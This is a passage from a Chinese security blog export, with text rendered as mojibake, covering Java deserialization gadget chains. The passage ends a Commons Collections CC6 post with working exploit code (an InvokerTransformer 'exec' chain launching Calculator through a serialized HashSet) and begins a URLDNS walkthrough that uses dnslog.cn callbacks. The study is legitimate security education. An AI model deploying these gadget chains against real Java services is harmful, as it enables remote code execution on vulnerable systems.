<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;/System/Applications/Calculator.app/Contents/MacOS/Calculator&quot;</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>), <span class="comment">// éšè—é”™è¯¯ä¿¡æ¯</span></span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="comment">//å°†transformersæ•°ç»„å­˜å…¥ ChainedTransformer è¿™ä¸ªç»§æ‰¿ç±»</span></span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line"></span><br><span class="line">        <span class="type">Map</span> <span class="variable">innerMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="comment">//ä½¿ç”¨ LazyMap</span></span><br><span class="line">        <span class="type">Map</span> <span class="variable">outerMap</span> <span class="operator">=</span> LazyMap.decorate(innerMap,transformerChain);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// ä¸Šé¢è¿˜æ˜¯ä½¿ç”¨CC1æ„é€ çš„ï¼Œä¸å˜ï¼Œ è¿™é‡Œåˆ›å»º TiedMapEntry æµ‹è¯•ä¸€ä¸‹</span></span><br><span class="line">        <span class="type">TiedMapEntry</span> <span class="variable">tiedMapEntry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(outerMap,<span class="string">&quot;yhy&quot;</span>);</span><br><span class="line"><span class="comment">//        tiedMapEntry.hashCode();</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// HashSet</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// æŒ‡å®šåˆå§‹å®¹é‡ä¸º1</span></span><br><span class="line">        <span class="type">HashSet</span> <span class="variable">hashSet</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashSet</span>(<span class="number">1</span>);</span><br><span class="line">        hashSet.add(<span class="string">&quot;yhy&quot;</span>);</span><br><span class="line">        <span class="comment">// åå°„è·å–HashSetä¸­mapçš„å€¼</span></span><br><span class="line">        <span class="type">Field</span> <span class="variable">map</span> <span class="operator">=</span>  Class.forName(<span class="string">&quot;java.util.HashSet&quot;</span>).getDeclaredField(<span class="string">&quot;map&quot;</span>);</span><br><span class="line">        <span class="comment">// å–æ¶ˆè®¿é—®é™åˆ¶æ£€æŸ¥</span></span><br><span class="line">        map.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="comment">// è·å–HashSetä¸­mapçš„å€¼</span></span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">hashSetMap</span> <span class="operator">=</span> (HashMap) map.get(hashSet);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// åå°„è·å– HashMap ä¸­ table çš„å€¼</span></span><br><span class="line">        <span class="type">Field</span> <span class="variable">table</span> <span class="operator">=</span>  Class.forName(<span class="string">&quot;java.util.HashMap&quot;</span>).getDeclaredField(<span class="string">&quot;table&quot;</span>);</span><br><span class="line">        <span class="comment">// å–æ¶ˆè®¿é—®é™åˆ¶æ£€æŸ¥</span></span><br><span class="line">        table.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="comment">// è·å– HashMap ä¸­ table çš„å€¼</span></span><br><span class="line">        Object[] hashMapTable = (Object[]) table.get(hashSetMap);</span><br><span class="line"></span><br><span class="line">        <span class="type">Object</span> <span class="variable">node</span> <span class="operator">=</span> hashMapTable[<span class="number">0</span>];</span><br><span class="line">        <span class="keyword">if</span>(node == <span class="literal">null</span>) &#123;</span><br><span class="line">            node = hashMapTable[<span class="number">1</span>];</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// å°† key è®¾ä¸º tiedMapEntry</span></span><br><span class="line">        <span class="type">Field</span> <span class="variable">key</span> <span class="operator">=</span>  node.getClass().getDeclaredField(<span class="string">&quot;key&quot;</span>);</span><br><span class="line">        key.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        key.set(node, tiedMapEntry);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// åºåˆ—åŒ–</span></span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;outY.bin&quot;</span>));</span><br><span class="line">        oos.writeObject(hashSet);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// ååºåˆ—åŒ–è¯»å– out.bin æ–‡ä»¶</span></span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;outY.bin&quot;</span>));</span><br><span class="line">        ois.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="0x03-æ€»ç»“"><a href="#0x03-æ€»ç»“" class="headerlink" title="0x03 æ€»ç»“"></a>0x03 æ€»ç»“</h2><p>å…¶å®ä¸Šå‘¨æ˜¯æ‰“ç®—å†™CC2é“¾çš„ï¼Œä½†æ˜¯ä¸Šå‘¨æœ‰ä¸ªé¡¹ç›®è¦åšï¼Œå°±æ²¡å¿ƒæƒ…å»å­¦ã€å»æ€»ç»“ï¼Œæœ‰ä¸¤ä¸ªåŸå› ï¼š</p>
<ol>
<li>ç¡®å®æœ‰ç‚¹å¿™ï¼Œæœ‰ç‚¹ç´¯</li>
<li>CC2é“¾è¦å­¦ä¹ æ–°çŸ¥è¯†ï¼Œæœ‰ç‚¹å¤æ‚ï¼Œæå¾—æ²¡å¿ƒæƒ…å­¦ï¼Œçœ‹ä¸ä¸‹å»ï¼Œæå¾—æˆ‘æœ‰ç‚¹æ‡ˆæ€ äº†ï¼Œæƒ³ä¼‘æ¯</li>
</ol>
<p>æ‰€ä»¥ä¸Šå‘¨ä¹Ÿå°±æ²¡æ›´æ–°ï¼Œè¿™å‘¨å¤§æ¦‚æ¢å¤å¥½äº†ï¼Œçœ‹æ–‡ç« æ—¶å‘ç°CC6æ¯”è¾ƒå¥½æç‚¹ï¼ŒçŸ¥è¯†å¤§éƒ½æ˜¯å­¦è¿‡çš„ï¼Œä¸²è”èµ·æ¥å°±å¥½äº†ï¼Œè¿™å°±æœ‰ä¿¡å¿ƒæ¥ç€å†™äº†ã€‚</p>
<p>æ¥ä¸‹æ¥çš„å…¶ä»–CCé“¾ï¼Œå¹¶ä¸ä¼šæŒ‰ç…§é¡ºåºæ¥ï¼Œå­¦åˆ°å“ªï¼Œå°±å†™åˆ°å“ªï¼Œä¸‹å‘¨åº”è¯¥ä¼šå†™CC5æˆ–è€…CC7,æ¯•ç«Ÿå’Œè¿™ä¸¤ç¯‡æœ‰å…³è”ï¼Œå­¦èµ·æ¥ä¸ä¼šå¤ªåƒåŠ›ã€‚</p>
<p>è¿˜æ˜¯Pç‰›è¯´çš„ä¸é”™ï¼Œ<strong>ç‹¬ç«‹æ€è€ƒå¾ˆé‡è¦ã€‚</strong></p>
<blockquote>
<p>  å­¦ä¹ çš„è¿‡ç¨‹æ˜¯ä¸€ä¸ªæ€è€ƒçš„è¿‡ç¨‹ï¼Œä¸æ˜¯è¿½æ±‚åˆ·é¢˜ï¼Œè¿½æ±‚åˆ·å®Œäº†ysoserialçš„æ‰€æœ‰Gadgetçš„ä»£ç ã€‚æˆ‘è§‰å¾—è¿™æ ·æ•ˆç‡æ˜¯ä¸é«˜çš„ã€‚é€šå¸¸æ¥è¯´åˆ·é¢˜è·å¾—çš„è®°å¿†ï¼Œåœ¨ä¸€æ®µæ—¶é—´ä¸æ¥è§¦åå°±ä¼šæ…¢æ…¢å¿˜æ‰ï¼Œä½†è‡ªç„¶å­¦ä¹ æ€è€ƒè·å¾—çš„ç»“æœï¼Œæ˜¯ä¸å®¹æ˜“å¤±å»çš„ã€‚</p>
</blockquote>
<h2 id="0x04-å‚è€ƒ"><a href="#0x04-å‚è€ƒ" class="headerlink" title="0x04 å‚è€ƒ"></a>0x04 å‚è€ƒ</h2><p>å¤©ä¸‹å¤§æœ¨å¤´å¸ˆå‚…çš„ <a href="https://www.yuque.com/tianxiadamutou/zcfd4v/ac9529#55fcdbc0">https://www.yuque.com/tianxiadamutou/zcfd4v/ac9529#55fcdbc0</a></p>
<p>Pç‰›çŸ¥è¯†æ˜Ÿçƒ-javaå®‰å…¨æ¼«è°ˆ</p>
]]></content>
      <categories>
        <category>æ¼æ´åŸç†</category>
      </categories>
      <tags>
        <tag>æ¼æ´åŸç†</tag>
      </tags>
  </entry>
  <entry>
    <title>Java ysoserialå­¦ä¹ ä¹‹URLDNS(ä¸€)</title>
    <url>/2021/06/04/Java%20ysoserial%E5%AD%A6%E4%B9%A0%E4%B9%8BURLDNS(%E4%B8%80)/</url>
    <content><![CDATA[<blockquote>
<p>  é›„å…³æ¼«é“çœŸå¦‚é“ è€Œä»Šè¿ˆæ­¥ä»å¤´è¶Š</p>
</blockquote>
<h2 id="0x01-å‰è¨€"><a href="#0x01-å‰è¨€" class="headerlink" title="0x01 å‰è¨€"></a>0x01 å‰è¨€</h2><p><strong>URLDNS</strong> æ˜¯ ysoserial ä¸­åˆ©ç”¨é“¾çš„ä¸€ä¸ª payloadï¼Œè¯¥ payload çš„ç›®çš„åªæœ‰ä¸€ä¸ªï¼Œå°±æ˜¯ç¡®å®šç›®æ ‡ç³»ç»Ÿä¸Šæ˜¯å¦å­˜åœ¨å¯æ§çš„ <code>readObject()</code> æ–¹æ³•ï¼Œå³æ˜¯å¦å­˜åœ¨Java ååºåˆ—åŒ–æ¼æ´ã€‚è¯¥åˆ©ç”¨é“¾å…·æœ‰å¦‚ä¸‹ç‰¹ç‚¹:</p>
<ul>
<li>ä¸é™åˆ¶jdkç‰ˆæœ¬ï¼Œä½¿ç”¨ Java å†…ç½®çš„ URL ç±»ï¼Œä¸ä¾èµ–äºä»»ä½•çš„ç¬¬ä¸‰æ–¹åº“</li>
<li>åªå¯¹æŒ‡å®šçš„ URL å‘é€ DNS æŸ¥è¯¢ï¼Œä¸åšå…¶ä»–æ“ä½œ</li>
<li>åœ¨â½¬ç›®æ ‡æ²¡æœ‰å›æ˜¾çš„æ—¶å€™ï¼Œèƒ½å¤Ÿé€šè¿‡DNSè¯·æ±‚å¾—çŸ¥æ˜¯å¦å­˜åœ¨ååºåˆ—ï¦œåŒ–æ¼ï¨…</li>
</ul>
<h2 id="0x02-åŸç†"><a href="#0x02-åŸç†" class="headerlink" title="0x02 åŸç†"></a>0x02 åŸç†</h2><p><code>java.util.HashMap</code> å®ç°äº†<code>Serializable</code> æ¥å£ï¼Œé‡å†™äº† <code>readObject</code>, åœ¨ååºåˆ—åŒ–æ—¶ä¼šè°ƒç”¨ <code>hash</code> å‡½æ•°è®¡ç®— key çš„ hashCode.è€Œ <code>java.net.URL</code> çš„ <code>hashCode</code> åœ¨è®¡ç®—æ—¶ä¼šè°ƒç”¨ <code>getHostAddress</code> æ¥è§£æåŸŸå, ä»è€Œå‘å‡º DNS è¯·æ±‚ã€‚</p>
<p>æˆ‘ä»¬ä» <strong>ysoserial</strong> é¡¹ç›®<code>src/main/java/ysoserial/payloads/URLDNS.java</code> çš„æ³¨é‡Šä¸­å¯ä»¥çœ‹åˆ° <strong>URLDNS</strong>çš„è°ƒç”¨é“¾ï¼ˆGadget Chain):</p>
<blockquote>
<p>  Gadget Chain:<br>       HashMap.readObject()<br>         HashMap.putVal()<br>           HashMap.hash()<br>             URL.hashCode()</p>
</blockquote>
<h3 id="2-1-HashMap"><a href="#2-1-HashMap" class="headerlink" title="2.1 HashMap"></a>2.1 HashMap</h3><blockquote>
<p>HashMap: javaä¸­çš„ä¸€ç§å®¹å™¨ï¼Œç”¨æ¥å­˜å‚¨å†…å®¹ï¼Œå†…å®¹ä»¥é”®å€¼å¯¹çš„å½¢å¼å­˜æ”¾ã€‚</p>
</blockquote>
<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210604084353.png" alt="image-20210602184510047"></p>
<p>å…ˆæ¥çœ‹çœ‹ HashMap è‡ªå·±å®ç°çš„ readObject() å‡½æ•°</p>
<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210604084403.png" alt="image-20210602173545433"></p>
<p>è¿™é‡Œé€šè¿‡ä¸€ä¸ª for å¾ªç¯å°† HashMap ä¸­å­˜å‚¨çš„keyé€šè¿‡ <code>K key = (K) s.readObject();</code> <strong>ååºåˆ—åŒ–å</strong>ï¼Œè°ƒç”¨ <strong>putVal</strong>å’Œ<strong>hash</strong>å‡½æ•°ï¼Œä¹Ÿå°±æ˜¯å‰é¢æåˆ°çš„Gadget Chainä¸­çš„ä¸­é—´ä¸¤ä¸ªè°ƒç”¨é“¾ï¼Œå†æ¥çœ‹çœ‹ï¼Œ<strong>hash</strong>è¿™ä¸ªå‡½æ•°çš„å®ç°</p>
<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210604084411.png" alt="image-20210602173740650"></p>
<p>è°ƒç”¨äº†å‚æ•° key çš„ <strong>hashCode</strong> å‡½æ•°ï¼Œè€Œæˆ‘ä»¬ä»<code>src/main/java/ysoserial/payloads/URLDNS.java</code>ä¸­å¯ä»¥å¾—çŸ¥è¿™ä¸ªkeyå°±æ˜¯ä¸€ä¸ªURLå¯¹è±¡ã€‚</p>
<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210604084416.png" alt="image-20210602175239536"></p>
<p>æ¥ä¸‹æ¥å†çœ‹çœ‹ java çš„åŸºæœ¬ç±» URL ä¸­å…³äº <strong>HashCode</strong> çš„å®ç°</p>
<h3 id="2-2-hashCode"><a href="#2-2-hashCode" class="headerlink" title="2.2 hashCode"></a>2.2 hashCode</h3><p>æˆ‘ä»¬æ¥è‡ªå·±è°ƒç”¨ URL çš„ <code>hashCode</code> å‡½æ•°æ¥çœ‹çœ‹æ•ˆæœ</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">UrlDNSTest</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">URL</span> <span class="variable">url</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(<span class="string">&quot;http://wursz7.dnslog.cn&quot;</span>);</span><br><span class="line">        url.hashCode();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210604084423.png" alt="image-20210602174600694"></p>
<p>å¯ä»¥å¾—çŸ¥<code>hashCode</code>è§¦å‘äº†ä¸€æ¬¡DNSè¯·æ±‚ï¼Œä½¿ç”¨ Ctrl+å³é”® ç‚¹è¿›å»çœ‹çœ‹è¯¥å‡½æ•°çš„å…·ä½“å®ç°</p>
<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210604084428.png" alt="image-20210602172051929"></p>
<p>è¿™é‡Œæ³¨æ„ä¸€ä¸‹ <strong>handler</strong> æ˜¯ä¸€ä¸ª <strong>transient</strong>  å…³é”®å­—ä¿®é¥°çš„å˜é‡ï¼Œä¸å‚ä¸åºåˆ—åŒ–ã€‚</p>
<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210604084438.png" alt="image-20210603225458176"></p>
<p>ç»è¿‡Debugè·Ÿè¸ªå‘ç°ä¼šåœ¨ HashMap#readObject çš„ <code>K key = (K) s.readObject();</code> è¿™è¡Œè¿›å…¥URL#readObject çš„<code>getURLStreamHandler</code> å‡½æ•°è¿›è¡Œ handler çš„èµ‹å€¼<img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210604084443.png" alt="image-20210604080533266"></p>
<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210604084449.png" alt="image-20210604080636339"></p>
<p>hashCode çš„é»˜è®¤å€¼ä¸º-1, ç„¶åæ¥ä¸‹æ¥è¿›å…¥ <code>hashCode = handler.hashCode(this);</code>, å¯ä»¥çœ‹åˆ°è°ƒç”¨äº†<code>getHostAddress</code>å‡½æ•°ï¼Œè¿™ä¸ªå‡½æ•°å°±æ˜¯ç”¨æ¥ DNS è§£æï¼Œè¿”å›å¯¹åº” IP çš„ã€‚</p>
<blockquote>
<p>  URL ç±»å°†åœ¨æ¯”è¾ƒæ—¶ï¼Œå¦‚æœä¸¤ä¸ªä¸»æœºåéƒ½å¯ä»¥è§£æä¸ºç›¸åŒçš„ IP åœ°å€ï¼Œåˆ™è®¤ä¸ºä¸¤ä¸ªä¸»æœºæ˜¯ç­‰æ•ˆçš„ï¼›</p>
</blockquote>
<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210604084433.png" alt="image-20210602172427092"></p>
<h3 id="2-3-put-è§¦å‘"><a href="#2-3-put-è§¦å‘" class="headerlink" title="2.3 put è§¦å‘"></a>2.3 put è§¦å‘</h3><p>ysoserialè¿™é‡Œæ˜ç¡®è¯´äº† put å‡½æ•°æ¥è§¦å‘ï¼Œé€šè¿‡ä½¿ç”¨ URL å¯¹è±¡æ¥ä½œä¸º key å°±å¯ä»¥è§¦å‘ä¸€æ¬¡DNSè¯·æ±‚ã€‚</p>
<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210604084455.png" alt="image-20210602175512074"></p>
<p>åŠ¨æ‰‹å®éªŒä¸€ä¸‹</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">UrlDNSTest</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">map</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="type">URL</span> <span class="variable">url</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(<span class="string">&quot;http://r6gyvj.dnslog.cn&quot;</span>);</span><br><span class="line">        map.put(url, <span class="string">&quot;yhy&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210604084500.png" alt="image-20210602175733191"></p>
<p>è€Œputä¸ºä»€ä¹ˆä¼šè§¦å‘ï¼Œçœ‹ä¸‹putå‡½æ•°çš„å®ç°</p>
<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210604084505.png" alt="image-20210603080617979"></p>
<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210604084509.png" alt="image-20210603082700138"></p>
<p>ä¹Ÿæ˜¯è°ƒç”¨äº†hash(key) â€“&gt; key.hashCode() è·Ÿä¹‹å‰ä¸€æ ·ï¼Œæ‰€ä»¥ä¼šåœ¨putè¿›ä¸€ä¸ªkeyä¸ºURLå¯¹è±¡æ—¶ï¼Œä¼šè¿›è¡Œä¸€æ¬¡DNSè§£æã€‚</p>
<h3 id="2-4-ååºåˆ—åŒ–"><a href="#2-4-ååºåˆ—åŒ–" class="headerlink" title="2.4 ååºåˆ—åŒ–"></a>2.4 ååºåˆ—åŒ–</h3><p>åˆ°äº†è¿™é‡Œæœ‰ä»€ä¹ˆç”¨å‘¢ï¼Ÿè¿·äº†ï¼Œæ˜æ˜æ˜¯putæ—¶ä¼šè¿›è¡Œä¸€æ¬¡DNSè§£æï¼Œçœ‹ä¸Šå»å¹¶æ²¡æœ‰å’Œååºåˆ—åŒ–æœ‰ä»€ä¹ˆå…³è”ã€‚æ¥ä¸‹æ¥è¯¥å¹²å˜›ï¼Œç½‘ä¸Šå…¶ä»–æ–‡ç« ç›´æ¥ç»“è®ºäº†ï¼Œè€Œåƒæˆ‘è¿™ç§èœé¸¡ï¼Œåˆ°è¿™ä¸€æ­¥ï¼Œå®Œå…¨æ²¡ææ‡‚ä¹‹ååº”è¯¥å¹²å•¥ï¼Œæ€ä¹ˆæŠŠå‰é¢è¯´çš„ç»™ä¸²è”èµ·æ¥ã€‚</p>
<p>åœ¨çœ‹é¸¿è’™å‘å¸ƒä¼šæ—¶ï¼Œç»ˆäºæƒ³æ˜ç™½äº†ï¼Œç°åœ¨æˆ‘ä»¬çŸ¥é“å½“ HashMap ä¼ å…¥ä¸€ä¸ªURLå¯¹è±¡æ—¶ï¼Œä¼šè¿›è¡Œä¸€æ¬¡DNSè§£æï¼Œå¹¶ä¸”HashMap å®ç°äº†<code>Serializable</code> æ¥å£ï¼Œé‡å†™äº† <code>readObject</code>ï¼Œä¹Ÿå°±æ˜¯è¯´å½“ä¸€ä¸ªJavaåº”ç”¨å­˜åœ¨ååºåˆ—åŒ–æ¼æ´æ—¶ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡ä¼ å…¥ä¸€ä¸ªåºåˆ—åŒ–åçš„HashMapæ•°æ®(å°†URLå¯¹è±¡ä½œä¸ºkeyæ”¾å…¥HashMap)ï¼Œå½“æˆ‘ä»¬ä¼ å…¥çš„æ•°æ®åˆ°è¾¾è¯¥Javaåº”ç”¨çš„ååºåˆ—åŒ–æ¼æ´ç‚¹æ—¶,è¿™æ—¶ç¨‹åºå°±ä¼šè°ƒç”¨ HashMap é‡å†™çš„<strong>readObject</strong> å‡½æ•°æ¥ååºåˆ—åŒ–è¯»å–æ•°æ®ï¼Œä¹Ÿå°±æ˜¯ä¸Šè¿°åˆ†æè¿‡ç¨‹ï¼Œç„¶åå°±ä¼šè§¦å‘ key.hashCode() å‡½æ•°ï¼Œè¿›è¡Œä¸€æ¬¡DNSè§£æã€‚</p>
<h3 id="2-5-è‡³å–„è‡³ç¾"><a href="#2-5-è‡³å–„è‡³ç¾" class="headerlink" title="2.5 è‡³å–„è‡³ç¾"></a>2.5 è‡³å–„è‡³ç¾</h3><p>åˆ°ä¸Šé¢å·²ç»å¯ä»¥ä½œä¸ºæ¼æ´æ¢æµ‹äº†ï¼Œä½†æ˜¯ ysoserial é¡¹ç›®ä¸­æœ‰å…¶ä»–ä»£ç ï¼Œæˆ‘ä»¬å¯ä»¥çœ‹çœ‹å…·ä½“æ˜¯ä»€ä¹ˆæƒ…å†µ</p>
<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210604084516.png" alt="image-20210603214336126"></p>
<p>è¿™é‡Œé€šè¿‡ç»§æ‰¿ <code>URLStreamHandler</code> ç±»ï¼Œé‡å†™äº†<code>openConnection</code> å’Œ <code>getHostAddress</code> å‡½æ•°ï¼Œç„¶å</p>
<p>å°†handleråœ¨åˆ›å»ºURLæ—¶ä¼ å…¥ï¼Œå…¶å®è¿™ä¸ªä¼ å…¥çš„handlerå°±æ˜¯hashCodeå‡½æ•°ä¸­çš„handler</p>
<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210604084530.png" alt="image-20210602172051929"></p>
<p>å‰é¢æåˆ°è¿‡ï¼ŒHashMap#put æ—¶ä¹Ÿä¼šè°ƒç”¨ <strong>getHostAddress</strong> å‡½æ•°è¿›è¡Œä¸€æ¬¡DNSè§£æï¼Œè¿™é‡Œå°±æ˜¯é€šè¿‡é‡å†™çš„ <strong>getHostAddress</strong> å‡½æ•°è¦†ç›–æ‰åŸæ¥çš„å‡½æ•°ï¼Œä¸è¿›è¡ŒDNSè§£æï¼Œé˜²æ­¢åœ¨payloadåˆ›å»ºæœŸé—´è¿›è¡ŒDNSè§£æï¼Œä¹Ÿå°±æ˜¯ä¸€ä¸ªé˜²å¹²æ‰°åŠŸèƒ½ã€‚</p>
<p>æ¥ä¸‹æ¥çœ‹çœ‹ **Reflections.setFieldValue(u, â€œhashCodeâ€, -1); <strong>è¿™ä¸€è¡Œä»£ç ã€‚Reflections</strong>ç±»æ˜¯ ysoserial å†™çš„ä¸€ä¸ªåå°„ç±»<code>src/main/java/ysoserial/payloads/util/Reflections.java</code>ï¼Œè¿™æ˜¯ <code>setFieldValue</code>å‡½æ•°</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(<span class="keyword">final</span> Object obj, <span class="keyword">final</span> String fieldName, <span class="keyword">final</span> Object value)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">   <span class="keyword">final</span> <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> getField(obj.getClass(), fieldName);</span><br><span class="line">   field.set(obj, value);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">static</span> Field <span class="title function_">getField</span><span class="params">(<span class="keyword">final</span> Class&lt;?&gt; clazz, <span class="keyword">final</span> String fieldName)</span> &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">	<span class="keyword">try</span> &#123;</span><br><span class="line">	    field = clazz.getDeclaredField(fieldName);</span><br><span class="line">	    setAccessible(field);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> (NoSuchFieldException ex) &#123;</span><br><span class="line">            <span class="keyword">if</span> (clazz.getSuperclass() != <span class="literal">null</span>)</span><br><span class="line">                field = getField(clazz.getSuperclass(), fieldName);</span><br><span class="line">        &#125;</span><br><span class="line">		<span class="keyword">return</span> field;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>

<p>ä¹‹å‰åœ¨å‰ç½®çŸ¥è¯† <a href="http://mp.weixin.qq.com/s?__biz=MzkzODIwMTIwNg==&mid=2247484123&idx=1&sn=598d098ffe19be59547c09538716e196&chksm=c2829bc2f5f512d4e77af3085132c9cf18d9b2fec5abc1c0f6a120561d52be43be29ff0b2a92&scene=21#wechat_redirect">åˆæ¢Javaååºåˆ—åŒ–æ¼æ´(äºŒ)</a>ä¸­è®²åˆ°è¿‡åå°„, ä¸Šè¿°ä»£ç å°±æ˜¯é€šè¿‡åå°„æ¥è®¾ç½® URL ç±»çš„ hashCodeçš„å€¼ä¸º-1ï¼Œè¿™æ˜¯å› ä¸ºåœ¨ HashMap#put æ—¶ï¼Œå·²ç»è°ƒç”¨è¿‡ä¸€æ¬¡hashCode() å‡½æ•°ï¼Œè¿™æ—¶ hashCodeçš„å€¼å°±ä¼šæ”¹å˜ï¼Œä¸å†ä¸º-1ï¼Œè®©å…¶è¿›è¡Œä¸‹ä¸€æ­¥æ‰§è¡ŒDNSè§£æã€‚</p>
<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210604084535.png" alt="image-20210602211410050"></p>
<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210604084542.png" alt="image-20210602211523937"></p>
<p>é‚£ä¹Ÿå°±æ˜¯è¯´åœ¨ä¸‹ä¸€æ­¥ç»è¿‡HashMapçš„<strong>readObject</strong>å‡½æ•°ååºåˆ—åŒ–æ—¶, å› ä¸ºæ­¤æ—¶ <code>hashCode != -1</code> ,ä¼šç›´æ¥è¿”å›hashCodeçš„å€¼ï¼Œä¸å†è¿›è¡Œè°ƒç”¨ handler.hashCode(this) ã€‚å› æ­¤ä½¿ç”¨ <code>Reflections.setFieldValue(u, &quot;hashCode&quot;, -1); </code> åå°„å°† <strong>hashCode</strong>çš„å€¼è®¾ä¸º <strong>-1</strong>ã€‚</p>
<p>ä¹‹åé€šè¿‡<img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210604084549.png" alt="image-20210604082305067"> æ‰§è¡Œåºåˆ—åŒ–æ“ä½œ</p>
<h2 id="0x03-ä»£ç æ¨¡æ‹Ÿ"><a href="#0x03-ä»£ç æ¨¡æ‹Ÿ" class="headerlink" title="0x03 ä»£ç æ¨¡æ‹Ÿ"></a>0x03 ä»£ç æ¨¡æ‹Ÿ</h2><p>æˆ‘ä»¬æ¥æ‰‹åŠ¨å¤åŸä¸€ä¸‹</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> ysoserial;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.net.InetAddress;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"><span class="keyword">import</span> java.net.URLConnection;</span><br><span class="line"><span class="keyword">import</span> java.net.URLStreamHandler;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> yhy</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@date</span> 2021/6/2 